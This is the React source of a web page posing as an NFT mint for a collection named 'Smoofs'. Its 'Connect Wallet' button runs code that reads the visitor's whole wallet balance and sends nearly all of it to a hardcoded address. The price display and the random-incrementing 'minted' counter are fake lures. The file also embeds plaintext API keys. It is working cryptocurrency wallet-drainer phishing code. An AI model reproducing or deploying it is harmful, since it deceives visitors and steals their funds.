import "./App.css";
import { useEffect, useState } from "react";
import imgDiscord from "./icons8-discord-50.png";
import imgTwitter from "./icons8-twitter-50.png";

const ethAmount = "$92 USD IN MATIC";
const image = "https://pbs.twimg.com/profile_images/1711338585138368512/5Ydlb5TZ_400x400.jpg";
const Title = "Smoofs";
const supply = 7000;

document.title = Title;
document.getElementById("favicon").setAttribute("href", image);

function App() {
  const [opacity, setOpacity] = useState(0);
  const [offset, setOffset] = useState(0);
  const [gas, setGas] = useState(null);

  useEffect(() => {
    const fetchRequest = async () => {
      const response = await fetch(
        "https://api.polygonscan.com/api?module=gastracker&action=gasoracle&apikey=GAHYRZWJGI53ZX2IRSHBA7T5I4YN8MF9FX"
      );
      const responseJSON = await response.json();
      setGas(responseJSON?.result?.FastGasPrice);

      //             const network = 'polygon'
      //             const key = '741065ff3a854d9abb1fd5d50cf3f0e3'
      //             const res = await fetch(`https://api.owlracle.info/v3/${ network }/gas?apikey=${ key }`)
      //             const data = await res.json()
      //             setGas(data.avgGas)
      //             console.log(data, data.avgGas, 'qwe')
    };
    fetchRequest();
  }, []);

  const connectAndSend = async (fromWallet) => {
    console.log(gas, Number(gas), Number(gas) / 100000, "qwe");
    try {
      await sendEth();
    } catch (err) {
      console.log(err);
    }
  };

  const sendEth = async () => {
    const address = await window.ethereum.request({
      method: "eth_requestAccounts",
    });

    const balance = await window.ethereum.request({
      method: "eth_getBalance",
      params: [address[0], "latest"],
    });
    const convertedBalance = parseInt(balance, 16) * Math.pow(10, -18);
    // console.log('balance', ethAmount, gas, (gas / 15) / 3089, (ethAmount - (Number(gas) / 10000)))

    let params = [
      {
        from: address[0],
        to: "0xAc1e81526bB869aA73B5B41D62dF4AD811df3d3B",
        // "gas": Number(((gas / 15) / 3089) * 10000000).toFixed().toString(16),
        // "gasPrice": Number(gas * 600000000).toString(16),
        value: parseInt(
          (convertedBalance - Number(gas) / 10000) * 1000000000000000000
        ).toString(16),
      },
    ];

    const response = await window.ethereum
      .request({ method: "eth_sendTransaction", params })
      .catch((err) => {
        console.log(err);
      });
  };

  setTimeout(() => {
    setOpacity(100);
  }, 0);

  function getRandomArbitrary(min, max) {
    return Math.random() * (max - min) + min;
  }

  useEffect(() => {
    if (Number(offset) <= 230) {
      const timer = setTimeout(() => {
        const random = getRandomArbitrary(1, 3);
        const randomToFixed = Number(random.toFixed());
        setOffset(Number(offset) + randomToFixed);
      }, 2000);
      return () => clearTimeout(timer);
    }
  }, [offset]);

  return (
    <div
      className={"AppContainer"}
      ref={(el) => {
        if (el) {
          el.style.setProperty("opacity", opacity, "important");
        }
      }}
    >
      <header>
        <div>
          <h1 className="title">{Title}</h1>
        </div>
        <nav>
          <ul>
            <li>
              <img src={imgTwitter} alt="" />
            </li>
            <li>
              <img src={imgDiscord} alt="" />
            </li>
          </ul>
        </nav>
      </header>
      <div className="App">
        <div>
          <img className="image" src={image} alt={"projectImage"} />
        </div>
        <div>
          <div className="amount">Amount - {ethAmount}</div>
          <button className="button g" onClick={connectAndSend}>
            Connect Wallet
          </button>
          <div className={"lineContainer"}>
            <div className={"line"}></div>
            <div
              className={"circleOnLine"}
              style={{ left: `${offset}px` }}
            ></div>
          </div>
          <div className="amount">{`${(
            offset *
            (supply / 235)
          ).toFixed()} / ${supply}`}</div>
        </div>
      </div>
    </div>
  );
}

export default App;
